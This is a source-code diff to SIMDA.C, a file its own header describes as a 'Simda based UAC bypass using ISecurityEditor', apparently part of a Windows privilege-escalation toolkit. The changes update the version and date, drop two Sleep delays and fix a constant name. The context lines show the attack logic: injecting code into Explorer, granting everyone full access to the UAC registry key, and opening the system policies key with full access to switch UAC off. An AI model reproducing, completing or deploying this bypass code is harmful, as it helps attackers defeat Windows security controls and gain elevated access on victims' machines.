@@ -4,9 +4,9 @@
 *
 *  TITLE:       SIMDA.C
 *
-*  VERSION:     1.50
+*  VERSION:     1.60
 *
-*  DATE:        05 Apr 2015
+*  DATE:        20 Apr 2015
 *
 *  Simda based UAC bypass using ISecurityEditor.
 *
@@ -195,7 +195,6 @@ BOOL ucmSimdaAlterKeySecurity(
 		g_ElevParams2.xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(hKrnl, "OutputDebugStringW");
 
 		bResult = ucmInjectExplorer(&g_ElevParams2, ucmElevatedDisableProc);
-		Sleep(2000);
 
 	} while (cond);
 
@@ -224,15 +223,13 @@ BOOL ucmSimdaTurnOffUac(
 
 		if (!ucmSimdaAlterKeySecurity(
 			T_UACKEY,
-			T_SSDL_ALL_FOR_EVERYONE)
+			T_SDDL_ALL_FOR_EVERYONE)
 			)
 		{
 			break;
 		}
 
 		if (bResult) {
-
-			Sleep(1000);
 		
 			lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,	TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system"), 
 				0, KEY_ALL_ACCESS, &hKey);
